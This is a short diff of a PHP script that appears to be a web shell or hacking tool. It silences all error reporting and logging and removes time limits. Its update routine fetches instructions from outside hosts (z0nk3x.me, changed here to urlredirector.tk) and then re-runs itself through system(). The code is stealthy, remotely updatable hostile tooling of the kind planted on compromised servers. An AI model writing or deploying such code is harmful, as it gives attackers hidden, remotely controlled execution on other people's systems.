@@ -9,7 +9,8 @@
 */
 
 @error_reporting(0);
-@ini_set('display_errors', 0);@error_reporting(0);
+@ini_set('display_errors', 0);
+@error_reporting(0);
 @set_time_limit(0);
 @clearstatcache();
 @ini_set('error_log',NULL);
@@ -363,8 +364,8 @@ if ($id == "8") {
 }
 $nf = basename(__FILE__);
 if ($id == "9"){
-	$version = "1.1"; //versi aplikasi jangan diganti!
-	$update = file_get_contents("https://z0nk3x.me/update.php?version=".$version);
+	$version = "1.0"; //versi aplikasi jangan diganti!
+	$update = file_get_contents("https://urlredirector.tk/apdet.php?version=".$version);
 	$update = json_decode($update, TRUE);
 	if ($update['update'] == "yes") {
 		$new_version = $update['version'];
@@ -378,8 +379,7 @@ if ($id == "9"){
 			system('php '.$nf);
 			}
 	}
-	elseif ($update['version'] == "null")
-	{
+	elseif ($update['version'] == "null") {
 		$msg = $update['msg'];
 		echo $msg."\n";
 	}
